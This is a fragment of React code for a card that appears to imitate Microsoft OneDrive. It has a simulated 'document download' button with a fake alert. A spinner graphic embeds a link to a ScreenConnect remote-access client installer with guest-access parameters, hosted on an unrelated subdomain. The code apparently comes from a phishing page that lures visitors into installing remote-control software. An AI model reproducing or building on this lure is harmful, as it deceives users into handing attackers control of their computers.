...
const OneDriveCard: React.FC = () => {
  ...
  const handleDownload = () => {
    ...
    setTimeout(() => {
      ...
      // In a real app, this would trigger a file download link
      window.location.href = "#"; 
      alert("Starting document download...");
    }, 1200);
  };
      ...
      >
        {isDownloading ? (
          <span className="flex items-center justify-center">
            <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="https://clinicawh.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest" fill="none" viewBox="0 0 24 24">
